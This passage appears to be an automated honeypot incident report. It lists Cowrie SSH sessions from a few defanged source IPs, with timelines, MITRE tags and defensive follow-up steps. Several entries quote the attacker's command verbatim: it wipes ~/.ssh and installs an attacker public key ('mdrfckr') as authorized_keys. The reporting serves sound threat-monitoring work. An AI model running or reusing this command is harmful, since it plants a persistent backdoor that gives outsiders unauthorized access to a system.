| `2026-05-20 19:39:40` | `cowrie.session.params` |
| `2026-05-20 19:39:40` | `cowrie.command.input` |
| `2026-05-20 19:39:40` | `cowrie.command.failed` |
| `2026-05-20 19:39:40` | `cowrie.log.closed` |
| `2026-05-20 19:39:41` | `cowrie.session.params` |
| `2026-05-20 19:39:41` | `cowrie.command.input` |
| `2026-05-20 19:39:41` | `cowrie.session.file_download` |
| `2026-05-20 19:39:41` | `cowrie.log.closed` |
| `2026-05-20 19:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0660ccafa947

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:39 |
| **Last Seen** | 2026-05-20 19:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:39:43` | `cowrie.session.connect` |
| `2026-05-20 19:39:43` | `cowrie.client.version` |
| `2026-05-20 19:39:44` | `cowrie.client.kex` |
| `2026-05-20 19:39:45` | `cowrie.login.success` |
| `2026-05-20 19:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f8a038a893

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:40 |
| **Last Seen** | 2026-05-20 19:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:40:37` | `cowrie.session.connect` |
| `2026-05-20 19:40:37` | `cowrie.client.version` |
| `2026-05-20 19:40:37` | `cowrie.client.kex` |
| `2026-05-20 19:40:38` | `cowrie.login.success` |
| `2026-05-20 19:40:38` | `cowrie.session.params` |
| `2026-05-20 19:40:38` | `cowrie.command.input` |
| `2026-05-20 19:40:38` | `cowrie.command.failed` |
| `2026-05-20 19:40:38` | `cowrie.log.closed` |
| `2026-05-20 19:40:38` | `cowrie.session.params` |
| `2026-05-20 19:40:38` | `cowrie.command.input` |
| `2026-05-20 19:40:38` | `cowrie.session.file_download` |
| `2026-05-20 19:40:38` | `cowrie.log.closed` |
| `2026-05-20 19:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed46367361bd

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:40 |
| **Last Seen** | 2026-05-20 19:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:40:39` | `cowrie.session.connect` |
| `2026-05-20 19:40:39` | `cowrie.client.version` |
| `2026-05-20 19:40:39` | `cowrie.client.kex` |
| `2026-05-20 19:40:40` | `cowrie.login.success` |
| `2026-05-20 19:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a8b099dbfa

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:41 |
| **Last Seen** | 2026-05-20 19:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:41:32` | `cowrie.session.connect` |
| `2026-05-20 19:41:32` | `cowrie.client.version` |
| `2026-05-20 19:41:32` | `cowrie.client.kex` |
| `2026-05-20 19:41:33` | `cowrie.login.success` |
| `2026-05-20 19:41:34` | `cowrie.session.params` |
| `2026-05-20 19:41:34` | `cowrie.command.input` |
| `2026-05-20 19:41:34` | `cowrie.command.failed` |
| `2026-05-20 19:41:34` | `cowrie.log.closed` |
| `2026-05-20 19:41:34` | `cowrie.session.params` |
| `2026-05-20 19:41:34` | `cowrie.command.input` |
| `2026-05-20 19:41:34` | `cowrie.session.file_download` |
| `2026-05-20 19:41:34` | `cowrie.log.closed` |
| `2026-05-20 19:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ddc4beab78

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:41 |
| **Last Seen** | 2026-05-20 19:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:41:39` | `cowrie.session.connect` |
| `2026-05-20 19:41:39` | `cowrie.client.version` |
| `2026-05-20 19:41:39` | `cowrie.client.kex` |
| `2026-05-20 19:41:41` | `cowrie.login.success` |
| `2026-05-20 19:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15387d4a0b40

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:43 |
| **Last Seen** | 2026-05-20 19:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:43:18` | `cowrie.session.connect` |
| `2026-05-20 19:43:18` | `cowrie.client.version` |
| `2026-05-20 19:43:18` | `cowrie.client.kex` |
| `2026-05-20 19:43:18` | `cowrie.login.success` |
| `2026-05-20 19:43:18` | `cowrie.session.params` |
| `2026-05-20 19:43:18` | `cowrie.command.input` |
| `2026-05-20 19:43:18` | `cowrie.command.failed` |
| `2026-05-20 19:43:18` | `cowrie.log.closed` |
| `2026-05-20 19:43:18` | `cowrie.session.params` |
| `2026-05-20 19:43:18` | `cowrie.command.input` |
| `2026-05-20 19:43:18` | `cowrie.session.file_download` |
| `2026-05-20 19:43:18` | `cowrie.log.closed` |
| `2026-05-20 19:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee463ddfd8e

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:43 |
| **Last Seen** | 2026-05-20 19:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:43:19` | `cowrie.session.connect` |
| `2026-05-20 19:43:19` | `cowrie.client.version` |
| `2026-05-20 19:43:20` | `cowrie.client.kex` |
| `2026-05-20 19:43:20` | `cowrie.login.success` |
| `2026-05-20 19:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3876f2616afd

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:43 |
| **Last Seen** | 2026-05-20 19:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:43:30` | `cowrie.session.connect` |
| `2026-05-20 19:43:30` | `cowrie.client.version` |
| `2026-05-20 19:43:31` | `cowrie.client.kex` |
| `2026-05-20 19:43:32` | `cowrie.login.success` |
| `2026-05-20 19:43:32` | `cowrie.session.params` |
| `2026-05-20 19:43:32` | `cowrie.command.input` |
| `2026-05-20 19:43:32` | `cowrie.command.failed` |
| `2026-05-20 19:43:33` | `cowrie.log.closed` |
| `2026-05-20 19:43:33` | `cowrie.session.params` |
| `2026-05-20 19:43:33` | `cowrie.command.input` |
| `2026-05-20 19:43:33` | `cowrie.session.file_download` |
| `2026-05-20 19:43:33` | `cowrie.log.closed` |
| `2026-05-20 19:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85aa63abb01e

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:43 |
| **Last Seen** | 2026-05-20 19:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:43:36` | `cowrie.session.connect` |
| `2026-05-20 19:43:36` | `cowrie.client.version` |
| `2026-05-20 19:43:37` | `cowrie.client.kex` |
| `2026-05-20 19:43:40` | `cowrie.login.success` |
| `2026-05-20 19:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4e3f4a2a19c

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:44 |
| **Last Seen** | 2026-05-20 19:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:44:38` | `cowrie.session.connect` |
| `2026-05-20 19:44:38` | `cowrie.client.version` |
| `2026-05-20 19:44:38` | `cowrie.client.kex` |
| `2026-05-20 19:44:38` | `cowrie.login.success` |
| `2026-05-20 19:44:38` | `cowrie.session.params` |
| `2026-05-20 19:44:38` | `cowrie.command.input` |
| `2026-05-20 19:44:38` | `cowrie.command.failed` |
| `2026-05-20 19:44:38` | `cowrie.log.closed` |
| `2026-05-20 19:44:38` | `cowrie.session.params` |
| `2026-05-20 19:44:38` | `cowrie.command.input` |
| `2026-05-20 19:44:38` | `cowrie.session.file_download` |
| `2026-05-20 19:44:38` | `cowrie.log.closed` |
| `2026-05-20 19:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef2a7bc96ed1

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:44 |
| **Last Seen** | 2026-05-20 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:44:40` | `cowrie.session.connect` |
| `2026-05-20 19:44:40` | `cowrie.client.version` |
| `2026-05-20 19:44:40` | `cowrie.client.kex` |
| `2026-05-20 19:44:40` | `cowrie.login.success` |
| `2026-05-20 19:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1856da2f3cbc

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 19:44 |
| **Last Seen** | 2026-05-20 19:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:44:48` | `cowrie.session.connect` |
| `2026-05-20 19:44:48` | `cowrie.client.version` |
| `2026-05-20 19:44:48` | `cowrie.client.kex` |
| `2026-05-20 19:44:49` | `cowrie.login.success` |
| `2026-05-20 19:44:49` | `cowrie.session.params` |
| `2026-05-20 19:44:49` | `cowrie.command.input` |
| `2026-05-20 19:44:49` | `cowrie.command.failed` |
| `2026-05-20 19:44:49` | `cowrie.log.closed` |
| `2026-05-20 19:44:50` | `cowrie.session.params` |
| `2026-05-20 19:44:50` | `cowrie.command.input` |
| `2026-05-20 19:44:50` | `cowrie.session.file_download` |
| `2026-05-20 19:44:50` | `cowrie.log.closed` |
| `2026-05-20 19:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0938cb48a84b

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 19:45 |
| **Last Seen** | 2026-05-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:45:01` | `cowrie.session.connect` |
| `2026-05-20 19:45:01` | `cowrie.client.version` |
| `2026-05-20 19:45:01` | `cowrie.client.kex` |
| `2026-05-20 19:45:01` | `cowrie.login.success` |
| `2026-05-20 19:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de99e5b45afb

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:45 |
| **Last Seen** | 2026-05-20 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:45:28` | `cowrie.session.connect` |
| `2026-05-20 19:45:28` | `cowrie.client.version` |
| `2026-05-20 19:45:28` | `cowrie.client.kex` |
| `2026-05-20 19:45:29` | `cowrie.login.success` |
| `2026-05-20 19:45:30` | `cowrie.session.params` |
| `2026-05-20 19:45:30` | `cowrie.command.input` |
| `2026-05-20 19:45:30` | `cowrie.command.failed` |
| `2026-05-20 19:45:30` | `cowrie.log.closed` |
| `2026-05-20 19:45:30` | `cowrie.session.params` |
| `2026-05-20 19:45:30` | `cowrie.command.input` |
| `2026-05-20 19:45:30` | `cowrie.session.file_download` |
| `2026-05-20 19:45:30` | `cowrie.log.closed` |
| `2026-05-20 19:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f705f4daba

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:45 |
| **Last Seen** | 2026-05-20 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:45:33` | `cowrie.session.connect` |
| `2026-05-20 19:45:34` | `cowrie.client.version` |
| `2026-05-20 19:45:34` | `cowrie.client.kex` |
| `2026-05-20 19:45:35` | `cowrie.login.success` |
| `2026-05-20 19:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6738efd5b63f

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:46 |
| **Last Seen** | 2026-05-20 19:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:46:00` | `cowrie.session.connect` |
| `2026-05-20 19:46:00` | `cowrie.client.version` |
| `2026-05-20 19:46:00` | `cowrie.client.kex` |
| `2026-05-20 19:46:00` | `cowrie.login.success` |
| `2026-05-20 19:46:00` | `cowrie.session.params` |
| `2026-05-20 19:46:00` | `cowrie.command.input` |
| `2026-05-20 19:46:00` | `cowrie.command.failed` |
| `2026-05-20 19:46:00` | `cowrie.log.closed` |
| `2026-05-20 19:46:01` | `cowrie.session.params` |
| `2026-05-20 19:46:01` | `cowrie.command.input` |
| `2026-05-20 19:46:01` | `cowrie.session.file_download` |
| `2026-05-20 19:46:01` | `cowrie.log.closed` |
| `2026-05-20 19:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5d08e2108a

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:46 |
| **Last Seen** | 2026-05-20 19:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:46:02` | `cowrie.session.connect` |
| `2026-05-20 19:46:02` | `cowrie.client.version` |
| `2026-05-20 19:46:02` | `cowrie.client.kex` |
| `2026-05-20 19:46:02` | `cowrie.login.success` |
| `2026-05-20 19:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
